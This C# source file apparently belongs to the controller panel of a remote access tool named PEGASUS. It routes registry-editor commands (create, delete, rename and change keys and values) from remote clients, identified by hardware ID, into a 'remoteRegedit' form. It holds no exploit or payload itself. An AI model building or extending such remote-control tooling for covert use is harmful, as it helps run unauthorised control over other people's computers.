namespace PEGASUS.BytesInOut
{
    using Microsoft.Win32;
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using ProtoBuf;
    using System.IO;
    using System.Windows.Forms;
    using static PEGASUS.IcarusWings.RegistrySeeker;

    /// <summary>
    /// Defines the <see cref="HandleRegManager" />.
    /// </summary>
    internal class HandleRegManager
    {
        /// <summary>
        /// The RegManager.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void RegManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "setClient":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                                if (FM.Client == null)
                                {
                                    client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                    FM.Client = client;
                                    FM.timer1.Enabled = true;
                                }

                            break;
                        }

                    case "CreateKey":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                var Matchbyte = unpack_msgpack.ForcePathObject("Match").GetAsBytes();

                                FM.CreateNewKey(ParentPath, DeSerializeMatch(Matchbyte));
                            }

                            break;
                        }

                    case "LoadKey":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var rootKey = unpack_msgpack.ForcePathObject("RootKey").AsString;
                                var Matchesbyte = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();

                                FM.AddKeys(rootKey, DeSerializeMatches(Matchesbyte));
                            }

                            break;
                        }

                    case "DeleteKey":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var rootKey = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                var subkey = unpack_msgpack.ForcePathObject("KeyName").AsString;

                                FM.DeleteKey(rootKey, subkey);
                            }

                            break;
                        }

                    case "RenameKey":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var rootKey = unpack_msgpack.ForcePathObject("rootKey").AsString;
                                var oldName = unpack_msgpack.ForcePathObject("oldName").AsString;
                                var newName = unpack_msgpack.ForcePathObject("newName").AsString;

                                FM.RenameKey(rootKey, oldName, newName);
                            }

                            break;
                        }

                    case "CreateValue":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                var Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                                var newKeyName = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                                var Kind = RegistryValueKind.None;
                                switch (Kindstring)
                                {
                                    case "-1":
                                        {
                                            Kind = RegistryValueKind.None;
                                            break;
                                        }
                                    case "0":
                                        {
                                            Kind = RegistryValueKind.Unknown;
                                            break;
                                        }
                                    case "1":
                                        {
                                            Kind = RegistryValueKind.String;
                                            break;
                                        }
                                    case "2":
                                        {
                                            Kind = RegistryValueKind.ExpandString;
                                            break;
                                        }
                                    case "3":
                                        {
                                            Kind = RegistryValueKind.Binary;
                                            break;
                                        }
                                    case "4":
                                        {
                                            Kind = RegistryValueKind.DWord;
                                            break;
                                        }
                                    case "7":
                                        {
                                            Kind = RegistryValueKind.MultiString;
                                            break;
                                        }
                                    case "11":
                                        {
                                            Kind = RegistryValueKind.QWord;
                                            break;
                                        }
                                }

                                var regValueData = new RegValueData();
                                regValueData.Name = newKeyName;
                                regValueData.Kind = Kind;
                                regValueData.Data = new byte[] { };

                                FM.CreateValue(keyPath, regValueData);
                            }

                            break;
                        }

                    case "DeleteValue":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                var ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;

                                FM.DeleteValue(keyPath, ValueName);
                            }

                            break;
                        }

                    case "RenameValue":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                var OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                                var NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;

                                FM.RenameValue(keyPath, OldValueName, NewValueName);
                            }

                            break;
                        }
                    case "ChangeValue":
                        {
                            var FM = (FormRegistryEditor)Application.OpenForms[
                                "remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                var keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                var RegValueDatabyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();

                                FM.ChangeValue(keyPath, DeSerializeRegValueData(RegValueDatabyte));
                            }

                            break;
                        }
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// The DeSerializeMatches.
        /// </summary>
        /// <param name="bytes">The bytes<see cref="byte[]"/>.</param>
        /// <returns>The <see cref="RegSeekerMatch[]"/>.</returns>
        public static RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
        {
            using (var ms = new MemoryStream(bytes))
            {
                var Matches = Serializer.Deserialize<RegSeekerMatch[]>(ms);
                return Matches;
            }
        }

        /// <summary>
        /// The DeSerializeMatch.
        /// </summary>
        /// <param name="bytes">The bytes<see cref="byte[]"/>.</param>
        /// <returns>The <see cref="RegSeekerMatch"/>.</returns>
        public static RegSeekerMatch DeSerializeMatch(byte[] bytes)
        {
            using (var ms = new MemoryStream(bytes))
            {
                var Match = Serializer.Deserialize<RegSeekerMatch>(ms);
                return Match;
            }
        }

        /// <summary>
        /// The DeSerializeRegValueData.
        /// </summary>
        /// <param name="bytes">The bytes<see cref="byte[]"/>.</param>
        /// <returns>The <see cref="RegValueData"/>.</returns>
        public static RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            using (var ms = new MemoryStream(bytes))
            {
                var Value = Serializer.Deserialize<RegValueData>(ms);
                return Value;
            }
        }
    }
}
